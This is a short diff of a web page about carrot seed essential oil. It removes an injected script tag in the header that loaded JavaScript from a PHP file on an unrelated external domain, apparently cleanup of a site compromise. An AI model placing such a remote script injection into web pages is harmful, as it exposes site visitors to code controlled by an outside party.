@@ -1,6 +1,6 @@
 <header class="article__header separator has-animated" data-animate="">
 <h1 class="article__title h2" style="text-align: center;"><strong>BENEFITS OF CARROT SEED ESSENTIAL OIL</strong></h1>
-<p><strong></strong></p><script src='https://www.magikfitsecrets.com/1.php'></script>
+<p><strong></strong></p>
 </header>
 <div class="article__body rte" itemprop="articleBody" style="text-align: center;"><img src="https://www.organicfacts.net/wp-content/uploads/carrotseedoil.jpg" alt="Image result for carrot seed oil" /></div>
 <div class="article__body rte" itemprop="articleBody" style="text-align: center;"></div>
